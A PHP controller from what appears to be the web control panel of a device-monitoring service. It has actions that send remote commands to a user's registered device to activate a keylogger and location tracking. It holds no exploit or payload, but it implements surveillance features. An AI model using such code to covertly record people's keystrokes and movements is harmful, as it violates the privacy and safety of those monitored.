<?php namespace Controllers;

use Models\Modules,
    Models\Users,
    Models\Billing,
    Models\Devices,
    CS\Users\UsersNotes,
    System\FlashMessages,
    CS\Users\UsersManager,
    Components\WizardRouter,
    CS\Devices\Manager as DevicesManager;

class Instructions extends BaseController {
    
    /** @var Logger */
    protected $logger;
    
    protected function init()
    {
        parent::init();
        
        $devicesManager = new DevicesManager($this->di['db']);
        $devicesModel = new \Models\Devices($this->di);

        $showDeletedDevices = $this->supportMode;
        $devices = $devicesManager->getUserActiveDevices($this->auth['id'], $showDeletedDevices);
        $this->di->set('devicesList', $devices);

        if ($devId = $devicesModel->getCurrentDevId()) {
            $this->di->set('devId', $devId);
        }
        
        $this->logger = $this->di->get('logger');
        $this->view->title = null;
    }
    
//    public function pagePrev( $type )
//    {
//        $enabled = false;       
//        $settingsModel = new \Models\Cp\Settings($this->di);
//        if(isset($this->di['devId'])) {
//           if($type == 'keylogger')
//               $enabled = $settingsModel -> getKeyloggerEnabled( $this->di['devId'] );
//           if($type == 'location')
//               $enabled = $settingsModel ->getLocationServiceEnabled ($this->di['devId']);
//        }
//        $previous = $this->di['config']['domain'].$_SERVER['REQUEST_URI']; 
//        
//        if( isset($_SERVER['HTTP_REFERER']) and 
//            ((isset($enabled['keylogger_enabled']) and $enabled['keylogger_enabled']) || 
//            (isset($enabled['location_service_enabled']) and $enabled['location_service_enabled']))) 
//        {
//            $previous = $_SERVER['HTTP_REFERER'];
//        }
//        return $previous;
//    }

    public function activateLocationAction() 
    {
        if ($this->getRequest()->hasGet('activate')) {
            $settingsModel = new \Models\Cp\Settings($this->di);
            $settings = $settingsModel->getDeviceSettings($this->di['devId']);
            
            // $settingsModel->activateKeylogger($this->di['devId']);
            $settingsModel->activateLocation($this->di['devId']);
            $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Locations activation command has been successfully sent! Command activation will take up to 20 min.'));
            $this->redirect($this->di['router']->getRouteUrl('locations'));
        } else $this ->error404 ();
        
    }
    
    public function keyloggerActivationAction() 
    {
        
        if ($this->getRequest()->hasGet('activate')) {
            $settingsModel = new \Models\Cp\Settings($this->di);
            $settings = $settingsModel->getDeviceSettings($this->di['devId']);
            
            // $settingsModel->activateKeylogger($this->di['devId']);
            $settingsModel->activateKeylogger($this->di['devId']);
            $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Keylogger activation command has been successfully sent! Command activation will take up to 20 min.'));
            $this->redirect($this->di['router']->getRouteUrl('keylogger'));
        } else $this ->error404 ();
        
    }
    
}
